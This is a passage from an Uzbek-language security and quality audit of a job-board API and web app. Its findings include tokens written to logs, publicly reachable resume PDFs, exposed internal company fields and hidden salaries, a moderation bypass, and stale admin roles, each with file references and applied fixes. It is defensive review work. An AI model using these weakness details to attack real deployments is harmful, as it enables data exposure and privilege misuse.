- **Recommended fix:** Bitta `useEffect([status, accessToken, q_submitted, attempt])` ichida AbortController bilan so'rov; `state: loading|error|ready` (EmployerVacanciesView.tsx:72-81 naqshi); xato uloqtiradigan fetcher (employer/vacancies/api.ts getJson kabi) ishlating; `openChat` uchun `messaging` state + disabled.
- **Dependencies:** lib/api.ts fetchCandidates xato semantikasi (API-client yo'nalishi bilan kelishib).
- **Risk:** Past.
- **Bajarilgan fix:** Nomzodlar sahifasi: AbortController bilan poyga yopildi, xato holati, "Xabar yozish" takroriy bosishdan himoyalangan. PHASE 6: Kompaniyasiz ish beruvchi uchun alohida holat (ISSUE-117), "Yana ko'rsatish" sahifalash (ISSUE-135).
- **Test/dalil:** web typecheck/build PASS; brauzer E1: /api/candidates 500 → xato holati, "Nomzod topilmadi" ko'rinmadi PASS

### ISSUE-024

**Rad etilgan vakansiyadan chiqish yo'li yo'q: tahrirlash holatni o'zgartirmaydi, PATCH rejected'dan o'tishga ruxsat bermaydi**

- **Severity:** P1 (agent bahosi: P1, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** employer/vacancy-flow
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:209`
- **Root cause:** PATCH allowedFrom = { active: [archived, draft], archived: [active] }, 'rejected' ham 'moderation' ham yo'q. PUT holatga umuman tegmaydi (160-187, e2e-check.mjs:660-661 ham shuni tasdiqlaydi). Employer yo'lida hech narsa status='moderation' qo'ymaydi: POST darhol 'active' (vacancies.service.ts:435, 457-458). Shuning uchun admin rad etgan vakansiyani qayta moderatsiyaga yuborib bo'lmaydi.
- **Impact:** Admin rad etgan vakansiya abadiy 'rejected' holatida qoladi. Employer uni tahrirlaydi, lekin qayta yubora olmaydi, yagona yo'l o'chirib qaytadan yaratish (u ham arizalarni cascade o'chiradi). 'Moderatsiyada' statistikasi kartasi amalda doimo 0 (VacancyStats.tsx:12). frontend vacancyCapabilities rejected uchun faqat edit va delete beradi (adapter.ts:97-103).
- **Evidence:** vacancies.routes.ts:195-223; admin.routes.ts:262-298 (moderate: active|rejected|archived, rejectionReason); adapter.ts:96-103; DESIGN.md:77-78 ('Qayta yuborish yo'q — backendda yo'q').
- **Recommended fix:** Minimal va backward-compatible: PUT'da, agar `vacancy.status === 'rejected'` va rol admin bo'lmasa, update data'ga `status: 'moderation', rejectionReason: null` qo'shish. Admin mavjud `/api/admin/vacancies/:id/moderate` orqali tasdiqlaydi. Frontend: edit'dan keyin notice 'moderatsiyaga yuborildi' deb chiqadi, VacancyRow rejected holatida 'Tahrirlash va qayta yuborish' yorlig'ini ko'rsatadi.
- **Dependencies:** admin.routes.ts moderation navbati. i18n notice. e2e-check.mjs:660 (PUT status o'zgarmaydi) check'i rejected holati uchun yangilanishi kerak.
- **Risk:** Past-o'rta: faqat rejected holatiga ta'sir qiladi.
- **Bajarilgan fix:** Rad etilgan e'lonni tahrirlash uni moderatsiyaga o'tkazadi (D-015).
- **Test/dalil:** e2e `[ISSUE-025/024/059]` PASS
- **Birlashtirilgan manbalar (2):**
  - R038 [employer-product, P1] `apps/api/src/modules/vacancies/vacancies.routes.ts:209` — Rad etilgan vakansiyaning chiqish yo'li yo'q: tahrirlash holatni o'zgartirmaydi, PATCH esa rejected'dan o'tishga ruxsat bermaydi
  - R219 [employer-product, P3] `apps/web/src/components/employer/applications/EmployerApplicationsView.tsx:130` — DESIGN.md bilan farqlar: markViewed optimistik, 'Moderatsiyada' kartasi erishib bo'lmaydigan holat, landing moderatsiya va'dasi

### ISSUE-025

**Vakansiyani o'chirish nomzodlarning arizalari, holat tarixi va saqlanganlarini cascade bilan jimgina o'chiradi**

- **Severity:** P1 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** data-loss
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:233`
- **Root cause:** `prisma.vacancy.delete` ishlatiladi, Application relation'i `onDelete: Cascade` (schema.prisma:458), ApplicationStatusHistory ham Cascade (479). Arizalar soniga qarab to'siq yo'q, nomzodga bildirishnoma ham yo'q.
- **Impact:** Employer faol, 50 ta arizasi bor vakansiyani bir tugma bilan o'chiradi va nomzodlarning 'Mening arizalarim' ro'yxatidan yozuvlar izsiz yo'qoladi. Employer'ning ham ariza tarixi yo'qoladi. UI o'chirishni istalgan holatda taklif qiladi (VacancyRow.tsx:237). Dialog faqat employer'ni ogohlantiradi (messages.uz.ts:2223), nomzodlarni emas.
- **Evidence:** vacancies.routes.ts:226-236; schema.prisma:458, 479; VacancyRow.tsx:235-238; favorites ham cascade (schema.prisma:560).
- **Recommended fix:** Backward-compatible: non-admin uchun, agar `_count.applications > 0` bo'lsa, 409 'Arizasi bor vakansiyani o'chirib bo'lmaydi — yoping' qaytarish. Frontend 'O'chirish' faqat arizasiz vakansiyalar uchun ko'rinsin, arizasi borlariga 'Yopish' taklif qilinsin. Qoralamalar (arizasiz) avvalgidek o'chiriladi.
- **Dependencies:** vacancyActionErrorKind (409 → transition matni) moslashtirilsin. e2e-check.mjs:290, 668, 739 da DELETE'lar arizasiz vakansiyalarda ekanini tekshiring.
- **Risk:** O'rta: mavjud e2e'lar arizali vakansiyani o'chirsa, ular yiqiladi.
- **Bajarilgan fix:** Arizasi bor vakansiyani ish beruvchi o'chira olmaydi (409), UI aniq xabar beradi.
- **Test/dalil:** e2e `[ISSUE-025/024/059]` PASS
- **Birlashtirilgan manbalar (3):**
  - R039 [employer-product, P1] `apps/api/src/modules/vacancies/vacancies.routes.ts:233` — Vakansiyani o'chirish nomzodlarning arizalari va holat tarixini jimgina butunlay o'chiradi
  - R090 [candidate-public, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:233` — Vakansiya o'chirilganda nomzodlarning arizalari va saqlanganlari cascade o'chadi: /applications tarixidan izsiz yo'qoladi
  - R105 [data-scale, P2] `apps/api/src/modules/vacancies/vacancies.routes.ts:704` — Vakansiyani hard-delete qilish barcha arizalar, status tarixi va favorites'ni cascade o'chiradi; nomzod ariza tarixini jim yo'qotadi

### ISSUE-026

**server.ts import qiladigan yangi modullar (support, team, articles.*, vacancies.rules) git'da untracked: HEAD'dan build/deploy yiqiladi**

- **Severity:** P1 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** WONT FIX
- **Area:** infra/git
- **Fayl:** `apps/api/src/server.ts:33`
- **Root cause:** git status: ?? apps/api/src/modules/support/, team/, articles/articles.admin.routes.ts, articles.backfill.ts, articles.content.ts, articles.permissions.ts, vacancies/vacancies.rules.ts, prisma/demo-articles.ts, prisma/assets/, web tomonda ko'plab components/lib/pages papkalari. server.ts (M) ularni import qiladi (23-25, 33, 179-180), HEAD'dagi server.ts'da support importi yo'q. CI yo'q.
- **Impact:** Railway/Vercel git'dan deploy qilsa, qisman commit (masalan faqat M fayllar) tsc'da ERR_MODULE_NOT_FOUND bilan yiqiladi. Commit qilinmagan katta hajmdagi ish OneDrive sinxronizatsiya konfliktida yoki disk xatosida yo'qolishi mumkin.
- **Evidence:** `git status --short | grep '^??'` natijasi; `git show HEAD:apps/api/src/server.ts | grep support` bo'sh; server.ts:23-25,33,173,179-180.
- **Recommended fix:** Mantiqiy guruhlab commit qiling (api modules + schema + e2e bitta commit, web pages alohida). Push'dan oldin `npm run typecheck && npm run build` ishlating. Minimal CI (GitHub Actions: install → typecheck → build) qo'shing.
- **Dependencies:** Barcha boshqa fix'lar shu commit bazasiga tayanadi.
- **Risk:** Past.
- **Lead auditor izohi:** Foydalanuvchi ko'rsatmasi: commit qilinmaydi — qaror foydalanuvchida.
- **Bajarilgan fix:** Commit qilinmagan fayllar — foydalanuvchi qarori ("COMMIT QILMA", D-030).
- **Test/dalil:** —

### ISSUE-027

**Admin rad etgan sharh muallif tahrirlaganda yana 'approved' bo'ladi (moderatsiyani chetlab o'tish)**

- **Severity:** P2 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** moderation
- **Fayl:** `apps/api/src/modules/reviews/reviews.routes.ts:45`
- **Root cause:** Sharh yaratish va yangilashda `status: "approved"` qat'iy yoziladi. Admin panelida pending/rejected moderatsiya oqimi bor (admin.routes.ts:71, 370-414), lekin nomzod yangilashi admin qarorini bekor qiladi.
- **Impact:** Moderation qoidasi (product rule 3) chetlab o'tiladi. Haqoratli yoki soxta sharh darhol ochiq kompaniya sahifasida va vakansiya reytingida ko'rinadi. Admin rad etgan sharhni muallif bitta POST bilan qayta chiqaradi.
- **Evidence:** reviews.routes.ts:13-14 izoh "Oldindan moderatsiya yo'q — darrov ko'rinadi"; 42-46 update data: { rating, comment, status: "approved" }; 47-55 create status: "approved". admin.routes.ts:71 companyReview.count({ where: { status: "pending" } }).
- **Recommended fix:** Yangi sharhni `status: "pending"` bilan yaratish. Yangilashda, agar mavjud sharh `rejected` bo'lsa, 409 qaytarish yoki yana `pending` qilish (hech qachon avtomatik approved emas). Javobda `status` qaytarish, UI esa "moderatsiyada" deb ko'rsatsin (CompanyReviews.tsx).
- **Dependencies:** CompanyReviews.tsx (optimistic item qo'shish 83-92) — pending holatini ko'rsatish kerak
- **Risk:** O'rta: UX o'zgaradi (sharh darhol ko'rinmaydi).
- **Lead auditor izohi:** Severity P1→P2: yangi sharhlarni darhol chop etish kodda hujjatlashtirilgan product qarori.
- **Bajarilgan fix:** Tasdiqlanmagan sharh tahrirlansa `pending` bo'ladi; UI moderatsiya holatini ko'rsatadi (D-020).
- **Test/dalil:** e2e `[ISSUE-027]` PASS

### ISSUE-028

**prestart har prod start'da prisma db push qiladi: destruktiv sxema o'zgarishida crash-loop, listen'dan oldin indeks build**

- **Severity:** P2 (agent bahosi: P1)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** WONT FIX
- **Area:** infra/deploy
- **Fayl:** `apps/api/package.json:14`
- **Root cause:** "prestart": "prisma db push --skip-generate" (package.json:14) `npm run start` (railway.json:8) oldidan ishlaydi. Yangi @@unique yoki indeks mavjud dublikat bilan to'qnashsa db push yiqiladi, start ishlamaydi va ON_FAILURE 10 marta qayta uriniladi (railway.json:11-12). Katta kolleksiyada (100k notification/message) indeks yaratish port ochilishidan OLDIN bo'ladi, healthcheckTimeout esa 120s (railway.json:9-10). server.ts:186-190 izohi bootstrap'ni listen'dan keyinga ko'chirgan, lekin db push hali ham oldin.
- **Impact:** Deploy davomida uzilish: yangi konteyner healthcheck'dan o'tmaydi yoki crash-loop'ga tushadi. Schema o'zgarishi review'siz prod bazaga tushadi. Har restart'da (masalan OOM) keraksiz db push ishlaydi.
- **Evidence:** apps/api/package.json:11,14; railway.json:8-13; DEPLOY.md:97-98 ('har deployda tekshiriladi'), DEPLOY.md:212-214.
- **Recommended fix:** prestart'ni olib tashlang. db push'ni alohida release bosqichiga o'tkazing: Railway deploy.preDeployCommand: "npx prisma db push --skip-generate" (bitta marta, start'dan oldin, healthcheck'ga ta'sir qilmaydi) yoki qo'lda `npm run db:push`. predev dev uchun qolishi mumkin. DEPLOY.md'ni yangilang.
- **Dependencies:** Railway preDeployCommand qo'llab-quvvatlanishi (railway.json schema) tekshirilsin; DEPLOY.md.
- **Risk:** Past-o'rta: db push unutilsa yangi maydon/indeks bo'lmaydi — deploy checklist'ga qo'shing.
- **Lead auditor izohi:** Severity P1→P2: DEPLOY.md'da ataylab qilingan; o'zgartirish Railway sozlamasini talab qiladi.
- **Bajarilgan fix:** `prestart: prisma db push` saqlandi (D-029); audit o'zgarishlari faqat additiv.
- **Test/dalil:** Dev nusxa bazasida (`ishbor_uitest`) `db push` ma'lumot bilan xatosiz o'tdi

### ISSUE-029

**Nomzod PDF rezyumesi /uploads/ da autentifikatsiyasiz, nomi userId+timestamp; o'chirish va qayta yuklash eski faylni diskdan o'chirmaydi; prod'da UPLOAD_DIR bo'sh bo'lsa jim**

- **Severity:** P2 (agent bahosi: P1, P2, P3)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Area:** privacy/uploads
- **Fayl:** `apps/api/src/modules/profile/profile.routes.ts:104`
- **Root cause:** Fayl nomi resume-<userId>-<Date.now()>.pdf (profile.routes.ts:104) va fastifyStatic butun UPLOAD_DIR'ni /uploads/ ostida hamma uchun beradi (server.ts:107). DELETE /api/profile/resume faqat resumeUrl=null qiladi (127-129), fayl diskda va URL orqali ochiq qoladi. env.ts:30 UPLOAD_DIR default '' → uploads.ts:13-15 process.cwd()/uploads; prod'da ogohlantirish yo'q.
- **Impact:** URL bir marta tarqalsa (ariza, chat, log, brauzer tarixi) nomzod rezyumesini (shaxsiy ma'lumot) istalgan kishi ko'radi va nomzod uni bekor qila olmaydi. Railway'da Volume sozlanmasa har deployda barcha logo/rezyume/muqova yo'qoladi, bazada esa buzilgan URL'lar qoladi.
- **Evidence:** profile.routes.ts:95-131; server.ts:107; common/uploads.ts:13-20; env.ts:30; DEPLOY.md:84-85,220; e2e'da /api/profile/resume chaqirilmaydi.
- **Recommended fix:** (1) DELETE va qayta yuklashda eski faylni fs.promises.unlink qiling (companies.routes.ts:147-150 dagi naqsh). (2) Nomzod rezyumesini static'dan chiqaring: nomi tasodifiy (crypto.randomUUID) bo'lsin va GET /api/profile/resume/:file orqali egasi yoki ariza qabul qilgan employer'ga authorized stream qiling; static'ni faqat logo/cover prefiksi uchun qoldiring. (3) server start'da isProd && !env.UPLOAD_DIR bo'lsa app.log.warn (yoki fail). e2e check: o'chirilgan rezyume URL → 404.
- **Dependencies:** Web'dagi resumeUrl ishlatiladigan joylar (employer arizalar sahifasi) yangi endpoint'ga o'tadi.
- **Risk:** O'rta: mavjud resumeUrl'lar uchun migratsiya yoki backward-compat (eski /uploads/resume-* ni vaqtincha qoldirish) kerak.
- **Lead auditor izohi:** Severity P1→P2: URL taxmin qilish qiyin, lekin o'chirilgan rezyume abadiy ochiq qoladi.
- **Bajarilgan fix:** PDF rezyume nomi tasodifiy, turi baytlardan tekshiriladi, almashtirish/o'chirishda fayl diskdan o'chiriladi. Fayl hali ham URL'ni bilgan kishiga ochiq (D-013).
- **Test/dalil:** e2e `[ISSUE-029/043]` PASS
- **Birlashtirilgan manbalar (4):**
  - R058 [tests-infra, P1] `apps/api/src/modules/profile/profile.routes.ts:104` — Nomzod PDF rezyumesi autentifikatsiyasiz ommaviy /uploads'da; 'o'chirish' faylni o'chirmaydi; prod'da UPLOAD_DIR bo'sh bo'lsa jim vaqtinchalik diskka yoziladi
  - R089 [candidate-public, P2] `apps/api/src/modules/profile/profile.routes.ts:127` — PDF rezyume autentifikatsiyasiz /uploads'da ochiq, "o'chirish" faylni diskdan o'chirmaydi
  - R184 [security-surface, P2] `apps/api/src/modules/profile/profile.routes.ts:104` — Nomzod rezyume PDF'lari /uploads/ da autentifikatsiyasiz, `resume-<userId>-<ms>.pdf` nomi bilan; eski fayl o'chirilmaydi
  - R212 [authz-idor, P3] `apps/api/src/modules/profile/profile.routes.ts:104` — Yuklangan PDF rezyumelar `/uploads/resume-<userId>-<timestamp>.pdf` nomi bilan autentifikatsiyasiz ochiq

### ISSUE-030

**Fastify logger WS access tokenini (?token=) va staff invite tokenini URL bilan logga yozadi**

- **Severity:** P2 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** security/logging
- **Fayl:** `apps/api/src/server.ts:48`
- **Root cause:** Fastify({ logger: true }) har so'rov uchun req.url'ni 'incoming request' logiga yozadi. WS token query'da keladi (chat.routes.ts:71-76). Staff invite token path'da: GET/POST /api/staff-invites/:token (team.routes.ts:215,221). Redact yoki serializer yo'q.
- **Impact:** Railway loglariga kira oladigan har kim (yoki log eksporti) 15 daqiqalik access token'lar va bir martalik jamoa taklif token'larini ko'radi. Taklifni qabul qilib content_editor roli olish mumkin (token hali ishlatilmagan bo'lsa).
- **Evidence:** server.ts:48 logger: true; chat.routes.ts:75-76 url.searchParams.get('token'); team.routes.ts:215,221.
- **Recommended fix:** logger: { serializers: { req(req) { return { method: req.method, url: req.url.replace(/([?&]token=)[^&]+/, '$1[REDACTED]').replace(/(\/staff-invites\/)[^/?]+/, '$1[REDACTED]'), hostname: req.hostname, remoteAddress: req.ip } } }, redact: ['req.headers.authorization','req.headers.cookie'] }. Uzoq muddatda WS uchun query token o'rniga bir martalik qisqa ticket.
- **Dependencies:** Yo'q
- **Risk:** Past: faqat log formati o'zgaradi.
- **Lead auditor izohi:** Empirik: probe-api.log'da '/ws/chat?token=eyJ...' bor.
- **Bajarilgan fix:** Logger serializer `?token=` va staff invite tokenini yashiradi.
- **Test/dalil:** e2e `[ISSUE-030]` PASS; PHASE 6: e2e `[ISSUE-030] [PHASE6-U34]` tokenning o'zi ham logda yo'q — PASS
- **Birlashtirilgan manbalar (3):**
  - R060 [tests-infra, P1] `apps/api/src/server.ts:48` — Pino default serializer access token (WS ?token=) va staff invite token'ini URL bilan logga yozadi
  - R071 [auth, P2] `apps/api/src/modules/chat/chat.routes.ts:75` — Access token WS query string'da va invite token URL path'da — Fastify default request logger ularni loglarga yozadi
  - R185 [security-surface, P2] `apps/api/src/server.ts:48` — Fastify default logger har WS ulanishida `req.url` ni yozadi → `/ws/chat?token=<accessToken>` loglarga tushadi

### ISSUE-031

**Noto'g'ri formatdagi :id bilan ~25 endpoint Prisma P2023 → 500 qaytaradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** api/validation
- **Fayl:** `apps/api/src/server.ts:214`
- **Root cause:** setErrorHandler faqat P2002/P2025 ni ushlaydi (214–221); P2023 (Malformed ObjectID) 500 ga tushadi. `objectId()` / `isObjectId` faqat favorites/companies, alerts body, team/articles admin'da ishlatilgan. Qolgan joylarda `req.params as { id }` to'g'ridan-to'g'ri `findUnique`/`update` ga beriladi.
- **Impact:** `/api/vacancies/abc/applications`, `/api/notifications/abc/read`, `/api/conversations/abc/messages`, `/api/admin/users/abc/block` va h.k. — 404 o'rniga 500 ("Kutilmagan xatolik") + log shovqini; frontend'da xato bo'sh holat/oddiy xato sifatida ko'rinadi. Xavfsizlik teshigi emas, lekin fuzzing'da 500 lar ko'p.
- **Evidence:** vacancies.routes.ts:78 (ownedVacancy), applications.routes.ts:32,192,217; favorites.routes.ts:77 (vacancyId tekshirilmagan); notifications.routes.ts:237,254; alerts.routes.ts:479,493; chat.routes.ts:15,306,332,364,403,414; admin.routes.ts:173,195,266,347,415,421; reviews.routes.ts:365.
- **Recommended fix:** server.ts error handler'ga: `if (error.code === "P2023") return reply.status(404).send({ error: "NOT_FOUND", message: "Topilmadi" })` — bitta joyda, barcha yo'llarni qamraydi. Qo'shimcha: `common/validation.ts` ga `paramId(req)` yordamchisi (isObjectId → 404) va asosiy yo'llarda ishlatish.
- **Dependencies:** Yo'q.
- **Risk:** Juda past.
- **Lead auditor izohi:** Empirik: 12 ta yo'lda 500.
- **Bajarilgan fix:** `idParams` zod tekshiruvi + P2023 → 404 global mapping.
- **Test/dalil:** e2e `[ISSUE-031]` PASS (17 ta endpoint, hech biri 5xx emas)
- **Birlashtirilgan manbalar (4):**
  - R086 [authz-idor, P2] `apps/api/src/server.ts:214` — `:id` parametrli ~25 endpoint ObjectId formatini tekshirmaydi → Prisma P2023 → 500 INTERNAL_ERROR
  - R156 [realtime-notifications, P2] `apps/api/src/modules/chat/chat.routes.ts:304` — Suhbat REST marshrutlarida `:id` ObjectId validatsiyasi yo'q → Prisma P2023 → 500
  - R196 [tests-infra, P2] `apps/api/src/server.ts:126` — Path param'dagi noto'g'ri ObjectId → Prisma P2023 → 500 (22 ta handler); e2e faqat body'dagi ObjectId'ni tekshiradi
  - R203 [validation-errors, P2] `apps/api/src/server.ts:117` — :id param'lar ObjectId sifatida tekshirilmaydi va errorHandler P2023 ni ushlamaydi — noto'g'ri id 404/400 o'rniga 500 beradi

### ISSUE-032

**Ochiq API (vakansiya ro'yxati/detail/similar, /api/companies/:slug, OG) kompaniyaning ichki maydonlarini qaytaradi: ownerUserId, stir, legalName, subscriptionPlanId/ExpiresAt**

- **Severity:** P2 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** privacy/response
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:177`
- **Root cause:** `GET /api/companies/:slug` `findUnique` + `include` — Company'ning barcha skalyarlari (schema.prisma:301–319) mehmonga qaytadi; `reviews.select.userId` (189) ochiq. `GET /api/vacancies` va `/api/vacancies/:slug` — `LIST_INCLUDE = { company: true }` (vacancies.service.ts:35) va getVacancyBySlug `company: { include }` (344–351) — har bir kartada to'liq Company. OG route ham `company: true` (og.routes.ts:201). Nomzod endpointlari (applications 109, favorites 43) esa to'g'ri whitelist qiladi; e2e (377–380, 777) faqat o'sha yo'llarni tekshiradi.
- **Impact:** Mehmon har qanday kompaniyaning egasi user ID'si, STIR, yuridik nomi, obuna holatini ko'radi; ownerUserId + reviews.userId boshqa endpointlarda ID sifatida ishlatiladi (masalan conversations/start candidateUserId — 11-topilma). Ro'yxat javobi 20–50 kartada ortiqcha maydonlar bilan shishadi (scale).
- **Evidence:** companies.routes.ts:177-199 `findUnique({ where: { slug }, include: {...} })` — `select` yo'q; :189 `userId: true`; vacancies.service.ts:35 `const LIST_INCLUDE = { company: true, region: true, category: true }`.
- **Recommended fix:** Umumiy `PUBLIC_COMPANY_SELECT = { id, name, slug, logoUrl, description, website, industry, employeeCount, foundedYear, isVerified, regionId/region, images, createdAt }` konstantasi (companies.list.ts CompanyListItem ga mos) va uni LIST_INCLUDE, getVacancyBySlug, similarVacancies, companies/:slug, og'da ishlatish. Sharhlarda `userId` o'rniga server tomonida `mine` (ixtiyoriy token bilan) yoki umuman olib tashlash.
- **Dependencies:** Frontend api.ts vakansiya/kompaniya adapterlari faqat ochiq maydonlarni o'qishini tekshirish (apps/web/src/lib/api.ts:199 atrofidagi mapper).
- **Risk:** O'rta — frontend `company.ownerUserId`/`reviews[].userId` ga tayangan bo'lsa (masalan 'mening sharhim' belgisi) moslashtirish kerak.
- **Lead auditor izohi:** Empirik: /api/vacancies items[].company kalitlarida ownerUserId, stir.
- **Bajarilgan fix:** `PUBLIC_COMPANY_SELECT` / `VACANCY_CARD_SELECT` — ichki maydonlarsiz (D-017).
- **Test/dalil:** e2e `[ISSUE-032/033]` PASS
- **Birlashtirilgan manbalar (3):**
  - R081 [authz-idor, P2] `apps/api/src/modules/companies/companies.routes.ts:177` — Ochiq javoblarda kompaniyaning ichki maydonlari (ownerUserId, stir, legalName, subscriptionPlanId/ExpiresAt) va sharh muallifining userId'si chiqadi
  - R183 [security-surface, P2] `apps/api/src/modules/companies/companies.routes.ts:201` — Ochiq kompaniya va vakansiya sahifalari kompaniyaning ichki maydonlarini (STIR, legalName, ownerUserId, obuna) va sharh muallifi userId'sini qaytaradi
  - R025 [candidate-public, P1] `apps/api/src/modules/vacancies/vacancies.service.ts:35` — Ochiq API javoblari yashirilgan maosh raqamlarini va kompaniyaning ichki maydonlarini xom holda qaytaradi

### ISSUE-033

**Yashirilgan maosh (isSalaryHidden) ochiq API javoblarida raqam bilan qaytadi — faqat frontend yashiradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** privacy/salary
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:35`
- **Root cause:** listVacancies/getVacancyBySlug/similarVacancies to'liq Vacancy obyektini (salaryMin/salaryMax) qaytaradi; yashirish faqat apps/web VacancyCard.tsx:33 va SimilarVacancies.tsx:13 da. Chat ro'yxati (chat.routes.ts:289–291) esa to'g'ri null qiladi — backend'ning o'zida ikki xil qoida.
- **Impact:** Ish beruvchi 'maoshni ko'rsatma' deb belgilagan bo'lsa ham, mehmon `/api/vacancies?...` yoki `/api/vacancies/:slug` orqali aniq raqamni ko'radi. Backend authoritative qoidasi (rule 3) buzilgan.
- **Evidence:** vacancies.service.ts:213-215, 243-249, 342-356 — `include`, `select`/mapping yo'q; chat.routes.ts:290 `salaryMin: vacancy.isSalaryHidden ? null : vacancy.salaryMin`.
- **Recommended fix:** vacancies.service.ts ga `publicVacancy(v)` serializer: `isSalaryHidden ? { ...v, salaryMin: null, salaryMax: null } : v`, ro'yxat/detail/similar/facets'dan qaytishdan oldin qo'llash. Employer o'z endpointlarida (`/api/employer/vacancies`, PUT javobi) raqam qoladi.
- **Dependencies:** 8-topilma OG bilan birga; frontend `isSalaryHidden` bo'yicha allaqachon yashiradi — regress yo'q.
- **Risk:** Past.
- **Lead auditor izohi:** Empirik: yashirin maoshli vakansiya list va detail'da salaryMin=7000000.
- **Bajarilgan fix:** `withPublicSalary()`; filtr va saralash yashirin maoshni hisobga olmaydi; yozilmagan maoshli e'lonlar saralashda tushib qolmaydi (D-016).
- **Test/dalil:** e2e `[ISSUE-032/033]` va `[ISSUE-033]` saralash PASS; PHASE 6: e2e `[PHASE6-U33]` saqlanganlar va o'xshash vakansiyalarda ham `null` — PASS

### ISSUE-034

**OG rasm draft/rejected/archived vakansiya uchun ham chiziladi, yashirilgan maoshni ko'rsatadi va 'immutable' keshlanadi**

- **Severity:** P2 (agent bahosi: P1, P2)
- **Verdict:** CONFIRMED (empirik: test bazasidagi probe serverda qayta hosil qilindi)
- **Holat:** FIXED
- **Area:** seo/privacy
- **Fayl:** `apps/api/src/modules/og/og.routes.ts:23`
- **Root cause:** formatSalaryLabel(vacancy.salaryMin, salaryMax, currency) chaqiriladi, lekin isSalaryHidden tekshirilmaydi. findUnique({ slug }) status bo'yicha filtrlamaydi.
- **Impact:** isSalaryHidden=true bo'lgan vakansiya ulashilganda (Telegram yoki Facebook preview) maosh rasmda ko'rinadi. Yopilgan yoki rad etilgan vakansiyaning sarlavhasi va kompaniyasi slug orqali ochiq qoladi, rasm esa 24 soat immutable cache'da turadi.
- **Evidence:** og.routes.ts:10-13 findUnique({ where: { slug }, include }) — status yo'q; 23: salaryLabel: formatSalaryLabel(vacancy.salaryMin, vacancy.salaryMax, vacancy.currency); 27: Cache-Control public, max-age=86400, immutable. Taqqoslash uchun: detail.ts:177 salaryVisible = !raw?.isSalaryHidden; chat.routes.ts:290 yashirilgan maosh null qilinadi.
- **Recommended fix:** `if (!vacancy || vacancy.status !== "active") return 404`; `salaryLabel: vacancy.isSalaryHidden ? "Maosh kelishiladi" : formatSalaryLabel(...)`. Cache'ni `max-age=3600` qilish (immutable'siz): holat yoki maosh o'zgarsa preview yangilanadi.
- **Dependencies:** common/format.ts formatSalaryLabel'ga hidden parametri qo'shilishi mumkin
- **Risk:** Past.
- **Lead auditor izohi:** Empirik: arxivlangan vakansiya OG → 200. Severity P1→P2.
- **Bajarilgan fix:** OG rasm faqat faol e'lon uchun, yashirin maosh chiqmaydi, `immutable` olib tashlandi.
- **Test/dalil:** e2e `[ISSUE-034/038]` PASS
- **Birlashtirilgan manbalar (3):**
  - R023 [candidate-public, P1] `apps/api/src/modules/og/og.routes.ts:23` — OG rasm yashirilgan maoshni chizadi va draft/rejected/archived vakansiyani ham ochadi
  - R084 [authz-idor, P2] `apps/api/src/modules/og/og.routes.ts:199` — OG rasm draft/moderation/rejected/archived vakansiya uchun ham chiziladi va yashirilgan maoshni ko'rsatadi
  - R170 [routing-seo, P2] `apps/api/src/modules/og/og.routes.ts:10` — OG rasm endpoint'i vakansiya statusini tekshirmaydi — draft/rejected/archived e'lon ma'lumoti ochiq

### ISSUE-035

**Admin yo'llari tokendagi rolga ishonadi (requireRole); roli olingan yoki bloklangan foydalanuvchi 15 daqiqa davomida API va ochiq WS'dan foydalanaveradi**

- **Severity:** P2 (agent bahosi: P2)
- **Verdict:** CONFIRMED (kod: lead auditor fayl:qatorni o'qib tasdiqladi)
- **Holat:** FIXED
- **Area:** authz
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:19`
- **Root cause:** requireAuth/requireRole (auth-guard.ts:386-404) DB'ga qaramaydi — faqat team/articles `requireStaff` (412-419) DB'dan tekshiradi. admin.routes.ts:19 `adminOnly = requireRole("admin")` — tokendagi rol. /api/admin/users/:id/block (168-189) va /role (191-) sessiya/socketga tegmaydi. WS auth faqat ulanishda (chat.routes.ts:71-80), realtime.ts'da userId bo'yicha yopish funksiyasi yo'q; ulangan socket token muddati tugagach ham cheksiz ochiq qoladi.
- **Impact:** Bloklangan foydalanuvchi 15 daqiqa API ishlatishda davom etadi va ochiq chat WS orqali xabar yuborishni cheksiz davom ettiradi (block'ning asosiy maqsadi — spam — 0 ta'sirsiz). Roli olib tashlangan admin 15 daqiqa /api/admin/* ga kira oladi (rol/blok o'zgartirish, foydalanuvchi ma'lumotlari).
- **Evidence:** apps/api/src/common/auth-guard.ts:386-404, 412-419; apps/api/src/modules/admin/admin.routes.ts:19, 168-189; apps/api/src/modules/chat/chat.routes.ts:71-80; apps/api/src/common/realtime.ts:12-40 (closeUserSockets yo'q).
